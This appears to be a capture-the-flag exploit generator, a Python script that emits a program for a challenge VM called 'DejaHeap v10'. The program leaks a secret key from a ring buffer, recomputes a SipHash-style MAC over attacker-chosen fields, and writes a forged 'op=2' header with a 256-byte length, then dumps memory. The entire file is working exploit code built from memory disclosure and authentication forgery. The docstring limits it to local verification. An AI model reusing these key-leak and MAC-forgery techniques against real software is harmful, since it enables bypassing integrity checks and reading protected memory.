#!/usr/bin/env python3
"""Generate DejaHeap v10 VM program to forge ring op=2 using runtime key (no precomputed MAC).
Based on verified 0x408130 integer operations, 2x32-bit limbs per uint64.
For LOCAL CTF verification only, does not connect to remote endpoint.
"""
from pathlib import Path
import argparse

REGS={name:(20+2*i,21+2*i) for i,name in enumerate('b v1 v2 v3 a x c d s m key t'.split())}
# b 20/21, v1 22/23, ... key 40/41, t 42/43
TMP_SUM=100; TMP_CARRY=101; TMP_HI=102
TMP_SHL1=103; TMP_SHL2=104; TMP_SHR1=105; TMP_SHR2=106
SHIFT1=107; SHIFT2=108
MASK=126; SHIFT32=125; BYTE=124
IDX=110; GET=111; SH=112; SHV=113

class E:
 def __init__(self):self.lines=[]
 def emit(self,code):self.lines.append(' '+code)
 def r(self,x):return f'r{x}'
 def mov(self,d,s):self.emit(f'mov {self.r(d)} {self.r(s)}')
 def const(self,d,v):
  if not (-2**31 <= v < 2**31):raise ValueError(('const',v))
  self.emit(f'const {self.r(d)} {v}')
 def op(self,op,d,a,b):self.emit(f'{op} {self.r(d)} {self.r(a)} {self.r(b)}')
 def copy(self,d,s):
  for k in range(2):self.mov(REGS[d][k],REGS[s][k])
 def init32(self,r,value):
  value &= 0xffffffff
  signed=value if value < 2**31 else value-2**32
  self.const(r,signed)
  if signed<0:self.op('and',r,r,MASK)
 def init64(self,n,value):
  lo,hi=REGS[n]
  self.init32(lo,value)
  self.init32(hi,value>>32)
 def xor(self,d,a,b):
  for i in range(2):self.op('xor',REGS[d][i],REGS[a][i],REGS[b][i])
 def add(self,d,a,b):
  al,ah=REGS[a];bl,bh=REGS[b];dl,dh=REGS[d]
  self.op('add',TMP_SUM,al,bl)
  self.op('shr',TMP_CARRY,TMP_SUM,SHIFT32)
  self.op('add',TMP_HI,ah,bh)
  self.op('add',TMP_HI,TMP_HI,TMP_CARRY)
  self.op('and',dl,TMP_SUM,MASK)
  self.op('and',dh,TMP_HI,MASK)
 def rol(self,d,a,k):
  al,ah=REGS[a];dl,dh=REGS[d]
  if k==32:
   self.mov(TMP_SHL1,ah);self.mov(TMP_SHL2,al)
   self.mov(dl,TMP_SHL1);self.mov(dh,TMP_SHL2)
   return
  assert 0<k<32
  self.const(SHIFT1,k);self.const(SHIFT2,32-k)
  self.op('shl',TMP_SHL1,al,SHIFT1)
  self.op('shr',TMP_SHR1,ah,SHIFT2)
  self.op('and',TMP_SHL1,TMP_SHL1,MASK)
  self.op('or',TMP_SHL1,TMP_SHL1,TMP_SHR1)
  self.op('shl',TMP_SHL2,ah,SHIFT1)
  self.op('shr',TMP_SHR2,al,SHIFT2)
  self.op('and',TMP_SHL2,TMP_SHL2,MASK)
  self.op('or',TMP_SHL2,TMP_SHL2,TMP_SHR2)
  self.mov(dl,TMP_SHL1);self.mov(dh,TMP_SHL2)
 def xor_const(self,n,val):
  for r,x in zip(REGS[n],(val&0xffffffff,(val>>32)&0xffffffff)):
   if not x:continue
   self.init32(TMP_SHL1,x)
   self.op('xor',r,r,TMP_SHL1)
 def sip2block(self):
  self.xor('b','b','m')
  self.add('a','v2','v3')
  self.rol('v2','v2',13)
  self.xor('v2','v2','a')
  self.copy('x','b')
  self.add('v1','v1','b')
  self.rol('a','a',32)
  self.rol('x','x',16)
  self.xor('x','x','v1')
  self.add('v1','v1','v2')
  self.rol('v2','v2',17)
  self.add('a','a','x')
  self.rol('x','x',21)
  self.xor('v2','v2','v1')
  self.xor('x','x','a') # 0x4082e9 critical
  self.rol('v1','v1',32)
  self.add('a','a','v2')
  self.add('v1','v1','x')
  self.rol('v2','v2',13)
  self.xor('v2','v2','a')
  self.rol('x','x',16)
  self.xor('x','x','v1')
  self.rol('a','a',32)
  self.add('v1','v1','v2')
  self.rol('v2','v2',17)
  self.add('a','a','x')
  self.rol('x','x',21)
  self.xor('v2','v2','v1')
  self.xor('b','x','a')
  self.xor('v3','m','a')
  self.rol('v1','v1',32)
 def finish(self):
  self.xor_const('b',0x2000000000000000)
  self.copy('a','v2')
  self.add('c','v3','v2')
  self.rol('a','a',13)
  self.add('d','b','v1')
  self.rol('b','b',16)
  self.xor('b','b','d')
  self.xor('a','a','c')
  self.rol('c','c',32)
  self.add('d','d','a')
  self.rol('a','a',17)
  self.copy('x','b')
  self.xor('a','a','d')
  self.add('c','c','b')
  self.rol('d','d',32)
  self.rol('x','x',21)
  self.xor('x','x','c')
  self.add('c','c','a')
  self.rol('a','a',13)
  self.xor('a','a','c')
  self.add('d','d','x')
  self.rol('x','x',16)
  self.xor('x','x','d')
  self.rol('c','c',32)
  self.add('d','d','a')
  self.rol('a','a',17)
  self.add('c','c','x')
  self.rol('x','x',21)
  self.xor('a','a','d')
  self.rol('d','d',32)
  self.xor('x','x','c')
  self.xor_const('c',0x2000000000000000)
  self.copy('s','d')
  self.xor_const('s',0xff) # xor sil,0xff
  for _ in range(4):
   self.add('c','c','a')
   self.add('s','s','x')
   self.rol('a','a',13)
   self.xor('a','a','c')
   self.rol('c','c',32)
   self.rol('x','x',16)
   self.xor('x','x','s')
   self.add('s','s','a')
   self.rol('a','a',17)
   self.xor('a','a','s')
   self.add('c','c','x')
   self.rol('x','x',21)
   self.xor('x','x','c')
   self.rol('s','s',32)
  self.xor('a','a','x')
  self.xor('a','a','c')
  self.xor('a','a','s')
 def leak_key(self):
  # ringpeek copies eight LE key bytes ring+0x98 into buffer r9.
  self.const(90,8);self.emit('buf r8 r90');self.mov(9,8)
  self.const(91,0x98);self.emit('ringpeek r8 r91')
  self.const(REGS['key'][0],0);self.const(REGS['key'][1],0)
  for i in range(8):
   r=REGS['key'][i//4]
   self.const(IDX,i)
   self.emit(f'getb r{GET} r9 r{IDX}')
   if i%4:
    self.const(SH,8*(i%4))
    self.op('shl',SHV,GET,SH)
    self.op('or',r,r,SHV)
   else:self.op('or',r,r,GET)
 def export_byte(self,i,src,shift):
  self.const(SH,shift)
  self.op('shr',SHV,src,SH)
  self.op('and',SHV,SHV,BYTE)
  self.const(IDX,0x70+i)
  self.emit(f'bset r7 r{IDX} r{SHV}')
 def fill_header(self):
  # copied object starts at ring+0; object_data starts at +0x10.
  # ring+0x80 -> buf index 0x70.
  for i,v in {0:2,4:1,16:3,33:1}.items():
   # offset 33 is ring+0xa1, i.e. len=256 (0x100)
   self.const(IDX,0x70+i);self.const(GET,v)
   self.emit(f'bset r7 r{IDX} r{GET}')
  # MAC 8 bytes at +8..+15 and key +24..+31 (header base 0x80)
  for out,src in ((8,'a'),(24,'key')):
   for k in range(8):self.export_byte(out+k,REGS[src][k//4],8*(k%4))

def make(output,dump_bytes=64):
 e=E()
 e.lines.extend(['.func main', ' const r3 1', ' hopen r6 r3',' call setup r12',' hflush r6',
  ' const r1 256',' buf r20 r1',' mov r21 r20', ' const r22 200',' ringpeek r20 r22',
  ' const r10 10',' putc r10'])
 for i in range(dump_bytes):
  e.lines.extend([f' const r23 {i}', ' getb r24 r21 r23', ' putc r24'])
 e.lines+=[' nl',' exit','.end', '.func setup',
  ' const r1 16',' buf r0 r1',' const r0 0',
  ' const r1 16',' buf r5 r1',' hexport r5 worker',' ret r0','.end',
  '.func worker',' gc',' gc',' const r1 256',' buf r7 r1']
 e.const(MASK,1);e.const(SHIFT32,32);e.op('shl',MASK,MASK,SHIFT32)
 e.const(90,1);e.op('sub',MASK,MASK,90)
 e.const(BYTE,255)
 e.leak_key()
 e.init64('b',0xb7b78592fee2c0c7)
 e.init64('v1',0xc912cca87c519df1)
 e.init64('v2',0xa7bd9391e9f2cad9)
 e.init64('v3',0xd604c6a862478ae5)
 # input: op=2, kind=1, fd=3, counter=0, key=runtime, length=256
 e.init64('m',(1<<32)|2);e.sip2block()
 e.init64('m',3);e.sip2block()
 e.copy('m','key');e.sip2block()
 e.init64('m',256);e.sip2block()
 e.finish()
 e.fill_header()
 e.lines+=[' ret r1','.end']
 Path(output).write_text('\n'.join(e.lines)+'\n')
 return len(e.lines)

if __name__=='__main__':
 p=argparse.ArgumentParser(description=__doc__)
 p.add_argument('--output',default='dh_forge_runtime.vm')
 p.add_argument('--dump-bytes',type=int,default=64)
 args=p.parse_args()
 n=make(args.output,args.dump_bytes)
 print(f'Generated {args.output}: {n} instructions/lines')
